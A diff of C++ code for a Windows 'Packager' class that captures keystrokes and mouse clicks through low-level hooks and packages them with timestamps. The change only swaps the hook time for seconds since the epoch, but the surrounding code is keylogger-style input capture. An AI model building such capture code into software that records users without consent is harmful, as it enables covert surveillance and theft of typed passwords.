@@ -42,6 +42,14 @@ Packager::~Packager()
 {
 }
 
+
+uint32_t Packager::secondsSinceEpoch() {
+	const boost::posix_time::ptime time = boost::posix_time::microsec_clock::local_time();
+	const boost::posix_time::ptime epoch = boost::posix_time::from_time_t(0);
+	boost::posix_time::time_duration duration = time - epoch;
+	return duration.total_seconds();
+}
+
 void Packager::addKey(int nCode, WPARAM wParam, LPARAM lParam) {
 	KBDLLHOOKSTRUCT *info = (KBDLLHOOKSTRUCT *)lParam;
 	_shift = ((info->vkCode == VK_LSHIFT || info->vkCode == VK_RSHIFT) && wParam == 256) ? true : _shift;
@@ -64,10 +72,9 @@ void Packager::addKey(int nCode, WPARAM wParam, LPARAM lParam) {
 		BYTE kbdState[256];
 		GetKeyboardState(kbdState);
 		WCHAR buff[2];
-
 		PaquetKeys *tmp = new PaquetKeys();
-		tmp->setDate(info->time);
-		std::string  str;
+		tmp->setDate(secondsSinceEpoch());
+		std::string	str;
 		if (_shift) {
 			str += "[MAJ] ";
 		}
@@ -104,7 +111,7 @@ void Packager::addClick(int nCode, WPARAM wParam, LPARAM lParam) {
 	std::cout << "addclick" << std::endl;
 	MSLLHOOKSTRUCT* info = (MSLLHOOKSTRUCT*)lParam;
 	PaquetMouse *tmp = new PaquetMouse();
-	tmp->setDate(info->time);
+	tmp->setDate(secondsSinceEpoch());
 	tmp->setX(info->pt.x);
 	tmp->setY(info->pt.y);
 	WORD highOrder = info->mouseData >> 16;
